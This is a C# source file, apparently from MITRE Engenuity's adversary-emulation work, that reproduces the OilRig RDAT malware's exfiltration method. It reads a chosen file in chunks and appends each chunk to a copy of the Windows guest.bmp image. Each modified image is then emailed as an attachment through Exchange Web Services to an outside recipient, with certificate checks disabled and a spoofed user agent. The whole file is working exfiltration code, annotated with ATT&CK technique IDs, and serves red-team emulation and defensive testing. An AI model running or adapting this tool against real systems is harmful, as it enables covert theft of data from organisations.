/*=============================================================================================
*
*    Description:  This program emulates RDAT's exfiltration capabilities
*   
*        Version:  1.0
*        Created:  March 15, 2022
*
*   Organization:  MITRE Engenuity
*
*   References(s):
*   https://attack.mitre.org/software/S0495/
*   https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/
*
*=============================================================================================
*/

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Xml;
using System.Xml.Linq;
using System.Linq;
using System.Collections.Generic;
using System.Net.Security;
using Microsoft.Exchange.WebServices.Data;

// namespace declaration
namespace exchange_web_service_client {

    // Class declaration
    class EWSClient {

        private string emailaddress = "";
        private string toemailaddress = "";
        private string user = "";
        private string domain = "";
        private string filepath = "";
        private string password = "";
        private string serverpath = "";
        private int chunksize = 1024;
        private string localbmp = @"guest.bmp";
        private string localbmptmp = @"guest.bmp.tmp";

        /// <summary>
        ///     Sends email with information provided by params. Credential and server
        ///     information is gathered by the class
        ///
        ///     MITRE ATT&CK Technique: T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
        /// </summary>
        /// <param name="count">
        ///     Will be added to the subject to keep count of emails from
        ///     the same file
        /// </param>
        /// <returns></returns>
        private void SendEmail(int count) {
            // Update TLS version
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            // Disable cert check
            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback
            (
            delegate { return true; }
            );
            // Hardcoded credentials for now
            WebCredentials userCredentials = new WebCredentials(this.user, this.password, this.domain);

            ExchangeService service = new ExchangeService();
            service.Url = new Uri(this.serverpath);
            service.Credentials = userCredentials;
            service.UserAgent = "firefox";
            service.Timeout = 1000000;
            EmailMessage email = new EmailMessage(service);
            email.Attachments.AddFileAttachment(@"guest.bmp");
            email.From = this.emailaddress;
            email.ToRecipients.Add(this.toemailaddress);
            email.Subject = "statesinput platformsystem connection " + count.ToString();
            email.Body = new MessageBody("memory userregistered 5/10/2019, pmssytem memory");
            email.SendAndSaveCopy();
        }

        /// <summary>
        ///     Appends data to BMP file
        ///
        ///     MITRE ATT&CK Technique: T1406 - Obfuscated Files or Information
        /// </summary>
        /// <returns></returns>
        private void AppendBmp(byte [] b) {
            using (FileStream exfilFile = File.Open(this.localbmp, FileMode.Append,  FileAccess.Write )) {
                exfilFile.Write(b, 0, b.Length);
            }
        }

        /// <summary>
        ///     Restores BMP file with tmp
        /// </summary>
        /// <returns></returns>
        private void RestoreBmp() {
            File.Copy(this.localbmptmp, this.localbmp, true);
        }

        /// <summary>
        ///     Chunks data from this.filepath, send data as attachment in SendEmail()
        ///     
        ///     MITRE ATT&CK Techniques: T1030 - Data Transfer Size Limits
        /// </summary>
        /// <returns></returns>
        private void ChunkAndSend() {
            // For each chunk:
            //      Append chunk data to guest.bmp
            //      Send file as attachment via SendEmail()
            //      Restore guest.bmp from guest.bmp.tmp
            using (var fileStream = new FileStream(this.filepath, FileMode.Open, FileAccess.Read)) {
                byte[] b = new byte[this.chunksize];
                int count = 1;
                UTF8Encoding data = new UTF8Encoding(true);
                while (fileStream.Read(b, 0, b.Length) > 0) {
                    AppendBmp(b);
                    SendEmail(count);
                    RestoreBmp();
                    count++;
                }
            }
        }

        /// <summary>
        ///     Copies guest.bmp if it exists and creates a temp version for later use
        /// </summary>
        /// <returns></returns>
        private void CopyGuestBmp() {
            string bmppath = @"C:\ProgramData\Microsoft\User Account Pictures\guest.bmp";
            if ( File.Exists(bmppath) ) {
                File.Copy(bmppath, this.localbmp, true);
                File.Copy(bmppath, this.localbmptmp, true);
            }
            else
                Environment.Exit(0);
        }

        /// <summary>
        ///     Usage of executable
        /// </summary>
        /// <returns></returns>
        private void Usage() {
            Console.WriteLine("usage:");
            Console.WriteLine("\t[--help] [--path=\"C:\\filepath\"] [--server=\"https:\\\\serveraddress\"] [--from=\"emailaddress@domain\"] [--to=\"emailaddressrecipient@domain\"] [--password=\"pwd_of_account\"]");
            Console.WriteLine("required arguments:");
            Console.WriteLine("\t--path: path of file that will be sent via email");
            Console.WriteLine("\t--server: address of the EWS server");
            Console.WriteLine("\t--from: email address of account that will be sending the emails");
            Console.WriteLine("\t--to: email address of recipient");
            Console.WriteLine("\t--password: password of account that will be sending the emails");
            Console.WriteLine("optional arguments:");
            Console.WriteLine("\t--chunksize: chunk to add to end of .bmp. e.g.: --chunksize=\"2048\". Default will be 1024 bytes");
            Environment.Exit(0);
        }

        /// <summary>
        ///     Verifies that all required fields are not empty
        /// </summary>
        /// <returns></returns>
        public void verifyClassData() {
            if (this.emailaddress.Length == 0) {
                Usage();
            }
            else if (this.toemailaddress.Length == 0) {
                Usage();
            }
            else if (this.user.Length == 0) {
                Usage();
            }
            else if (this.domain.Length == 0) {
                Usage();
            }
            else if (this.filepath.Length == 0) {
                Usage();
            }
            else if (this.password.Length == 0) {
                Usage();
            }
            else if (this.serverpath.Length == 0) {
                Usage();
            }
        }

        /// <summary>
        ///     Parses command-line arguments and stores the results in the class
        /// </summary>
        /// <param name="args">
        ///     Contains command-line arguments
        /// </param>
        /// <returns></returns>
        public void parseArgs(string [] args) {
            if (args.Length == 0) {
                Usage();
            }

            // parse arguments
            foreach (var arg in args) {
                string[] argElem = arg.Split('=');
                if (argElem.Length < 2) {
                    Usage();
                }

                // Check size
                if (argElem[0].Length > 50 || argElem[1].Length > 100) {
                    Usage();
                }

                // filepath
                if (argElem[0].Equals("--path")) {
                    if (!File.Exists(argElem[1])) {
                        Console.WriteLine("Filepath provided does not exist");
                        Environment.Exit(0);
                    }
                    this.filepath = argElem[1];
                }
                // email, user, and domain
                else if (argElem[0].Equals("--from")) {

                    this.emailaddress = argElem[1];
                    string[] elemSplit = argElem[1].Split('@');
                    if (elemSplit.Length < 2) {
                        Console.WriteLine("Please provide a valid email");
                        Environment.Exit(0);
                    }
                    this.user = elemSplit[0];
                    this.domain = elemSplit[1];
                }
                else if (argElem[0].Equals("--to")) {
                    // Check if it has @ in the address
                    string[] elemSplit = argElem[1].Split('@');
                    if (elemSplit.Length < 2) {
                        Console.WriteLine("Please provide a valid email");
                        Environment.Exit(0);
                    }
                    this.toemailaddress = argElem[1];
                }
                // password
                else if (argElem[0].Equals("--password")) {
                    this.password = argElem[1];
                }
                // server address
                else if (argElem[0].Equals("--server")) {
                    if (!argElem[1].StartsWith("https://")) {
                        this.serverpath = "https://" + argElem[1];
                    }
                    else {
                        this.serverpath = argElem[1];
                    }
                    this.serverpath += "/EWS/Exchange.asmx";                    
                }
                // optional: chunksize
                else if (argElem[0].Equals("--chunksize")) {
                    int number;
                    if (Int32.TryParse(argElem[1], out number))
                        this.chunksize = number;
                    else
                        Usage();
                }
                else {
                    Usage();
                }
            }
            verifyClassData();
        }
            
        // Main Method
        static void Main(string[] args) {
            // EWSClient class
            EWSClient ewsclient = new EWSClient();
            ewsclient.parseArgs(args);
            ewsclient.CopyGuestBmp();
            ewsclient.ChunkAndSend();
        }
    }
}
